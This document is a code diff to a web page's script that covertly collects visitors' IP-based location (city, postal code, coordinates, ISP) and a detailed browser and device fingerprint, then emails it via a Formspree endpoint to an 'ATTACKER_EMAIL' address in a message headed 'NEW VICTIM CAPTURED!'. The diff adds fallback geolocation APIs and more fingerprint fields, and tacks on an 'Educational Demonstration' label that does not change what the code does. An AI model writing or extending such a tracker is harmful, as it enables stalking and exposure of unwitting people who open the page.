@@ -106,7 +106,7 @@
     </div>
 
     <script>
-        // ⚠️ REPLACE THESE TWO LINES WITH YOUR INFO:
+        // ⚠️ CONFIGURE THESE:
         const ATTACKER_EMAIL = "yasmineelhedhili@gmail.com";
         const FORMSPREE_ENDPOINT = "https://formspree.io/f/mrbrqjgl";
 
@@ -125,30 +125,94 @@
         
         async function collectData() {
             let ipData = {};
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                ipData = await response.json();
-            } catch (error) {
-                console.error('IP fetch error:', error);
+            
+            // Try multiple APIs for better reliability
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://api.ipify.org?format=json',
+                'https://ipinfo.io/json',
+                'https://geolocation-db.com/json/'
+            ];
+            
+            // Try each API until one works
+            for (const api of apis) {
+                try {
+                    const response = await fetch(api);
+                    const data = await response.json();
+                    if (data && (data.ip || data.IPv4)) {
+                        ipData = data;
+                        break;
+                    }
+                } catch (error) {
+                    console.log(`API ${api} failed, trying next...`);
+                }
+            }
+            
+            // Get additional details from ipapi.co if we only have basic IP
+            if (ipData.ip && !ipData.city) {
+                try {
+                    const detailResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const details = await detailResponse.json();
+                    ipData = { ...ipData, ...details };
+                } catch (error) {
+                    console.log('Detailed lookup failed');
+                }
             }
             
             const ua = navigator.userAgent;
+            
+            // Get connection info
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const connectionType = connection ? connection.effectiveType : 'Unknown';
+            
             return {
-                ip: ipData.ip || 'Unknown',
+                // IP Information
+                ip: ipData.ip || ipData.IPv4 || ipData.query || 'Unable to detect',
+                
+                // Location
                 city: ipData.city || 'Unknown',
-                region: ipData.region || 'Unknown',
-                country: ipData.country_name || 'Unknown',
-                latitude: ipData.latitude || 0,
-                longitude: ipData.longitude || 0,
-                isp: ipData.org || 'Unknown',
+                region: ipData.region || ipData.region_name || 'Unknown',
+                country: ipData.country_name || ipData.country || ipData.country_name || 'Unknown',
+                countryCode: ipData.country_code || ipData.country_code || '',
+                postal: ipData.postal || ipData.zip || 'Unknown',
+                latitude: ipData.latitude || ipData.lat || 0,
+                longitude: ipData.longitude || ipData.lon || 0,
+                timezone: ipData.timezone || 'Unknown',
+                
+                // ISP
+                isp: ipData.org || ipData.isp || ipData.as || 'Unknown',
+                
+                // Device fingerprinting
                 device: /Mobile|Android|iPhone|iPad/.test(ua) ? 'Mobile Device' : 'Desktop/Laptop',
                 browser: getBrowser(ua),
+                browserVersion: getBrowserVersion(ua),
                 os: getOS(ua),
-                screen: window.screen.width + 'x' + window.screen.height,
+                osVersion: getOSVersion(ua),
+                
+                // Screen and display
+                screen: `${window.screen.width}x${window.screen.height}`,
+                screenColorDepth: window.screen.colorDepth + ' bits',
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                
+                // Other info
+                language: navigator.language || navigator.userLanguage,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                platform: navigator.platform,
+                connectionType: connectionType,
+                cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                doNotTrack: navigator.doNotTrack || 'Not set',
+                
+                // Time
                 timestamp: new Date().toLocaleString(),
-                mapLink: ipData.latitude && ipData.longitude 
-                    ? `https://www.openstreetmap.org/?mlat=${ipData.latitude}&mlon=${ipData.longitude}#map=15/${ipData.latitude}/${ipData.longitude}`
-                    : 'No location'
+                timezone_local: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                // Map link
+                mapLink: (ipData.latitude || ipData.lat) && (ipData.longitude || ipData.lon)
+                    ? `https://www.openstreetmap.org/?mlat=${ipData.latitude || ipData.lat}&mlon=${ipData.longitude || ipData.lon}#map=13/${ipData.latitude || ipData.lat}/${ipData.longitude || ipData.lon}`
+                    : 'Location unavailable',
+                
+                // User Agent
+                userAgent: ua
             };
         }
         
@@ -156,30 +220,53 @@
             try {
                 const emailBody = `
 🎯 NEW VICTIM CAPTURED!
+═══════════════════════
 
-📍 LOCATION:
-- City: ${data.city}
-- Region: ${data.region}  
-- Country: ${data.country}
+📍 LOCATION DETAILS:
+• City: ${data.city}
+• Region: ${data.region}
+• Country: ${data.country} ${data.countryCode}
+• Postal Code: ${data.postal}
+• Timezone: ${data.timezone}
+• Local Time: ${data.timestamp}
 
-🌐 IP: ${data.ip}
-🏢 ISP: ${data.isp}
+🌐 IP INFORMATION:
+• IP Address: ${data.ip}
+• ISP Provider: ${data.isp}
 
-💻 DEVICE:
-- Type: ${data.device}
-- OS: ${data.os}
-- Browser: ${data.browser}
-- Screen: ${data.screen}
+💻 DEVICE FINGERPRINT:
+• Device Type: ${data.device}
+• Operating System: ${data.os} ${data.osVersion}
+• Browser: ${data.browser} ${data.browserVersion}
+• Platform: ${data.platform}
 
-🕐 Time: ${data.timestamp}
+📱 DISPLAY INFO:
+• Screen Resolution: ${data.screen}
+• Color Depth: ${data.screenColorDepth}
+• Viewport Size: ${data.viewport}
 
-🗺️ Map: ${data.mapLink}
+🌍 USER PREFERENCES:
+• Language: ${data.language}
+• All Languages: ${data.languages}
+• Connection Type: ${data.connectionType}
+• Cookies Enabled: ${data.cookiesEnabled}
+• Do Not Track: ${data.doNotTrack}
+
+🗺️ VIEW ON MAP:
+${data.mapLink}
+
+🔍 FULL USER AGENT:
+${data.userAgent}
+
+═══════════════════════
+⚠️ Educational Demonstration
                 `.trim();
 
                 const formData = new FormData();
                 formData.append('email', ATTACKER_EMAIL);
-                formData.append('subject', '🚨 New Victim - IP Tracker Alert');
+                formData.append('subject', '🚨 VICTIM CAPTURED - IP Tracker Alert');
                 formData.append('message', emailBody);
+                formData.append('_replyto', ATTACKER_EMAIL);
 
                 await fetch(FORMSPREE_ENDPOINT, {
                     method: 'POST',
@@ -187,29 +274,47 @@
                     headers: { 'Accept': 'application/json' }
                 });
                 
-                console.log('Email sent!');
+                console.log('Data sent successfully!');
             } catch (error) {
-                console.error('Email failed:', error);
+                console.error('Send failed:', error);
             }
         }
         
         function getBrowser(ua) {
-            if (ua.indexOf("Firefox") > -1) return "Firefox";
-            if (ua.indexOf("SamsungBrowser") > -1) return "Samsung";
+            if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
+            if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
             if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
-            if (ua.indexOf("Edg") > -1) return "Edge";
-            if (ua.indexOf("Chrome") > -1) return "Chrome";
+            if (ua.indexOf("Trident") > -1) return "Internet Explorer";
+            if (ua.indexOf("Edg") > -1) return "Microsoft Edge";
+            if (ua.indexOf("Chrome") > -1) return "Google Chrome";
             if (ua.indexOf("Safari") > -1) return "Safari";
-            return "Unknown";
+            return "Unknown Browser";
+        }
+        
+        function getBrowserVersion(ua) {
+            let match;
+            if ((match = ua.match(/(?:Firefox|Chrome|Safari|Opera|Edg)\/([0-9.]+)/))) {
+                return match[1];
+            }
+            return '';
         }
         
         function getOS(ua) {
             if (ua.indexOf("Win") > -1) return "Windows";
             if (ua.indexOf("Mac") > -1) return "MacOS";
-            if (ua.indexOf("Linux") > -1) return "Linux";
+            if (ua.indexOf("X11") > -1 || ua.indexOf("Linux") > -1) return "Linux";
             if (ua.indexOf("Android") > -1) return "Android";
             if (ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) return "iOS";
-            return "Unknown";
+            return "Unknown OS";
+        }
+        
+        function getOSVersion(ua) {
+            let match;
+            if ((match = ua.match(/Windows NT ([0-9.]+)/))) return match[1];
+            if ((match = ua.match(/Mac OS X ([0-9_]+)/))) return match[1].replace(/_/g, '.');
+            if ((match = ua.match(/Android ([0-9.]+)/))) return match[1];
+            if ((match = ua.match(/OS ([0-9_]+)/))) return match[1].replace(/_/g, '.');
+            return '';
         }
     </script>
 </body>
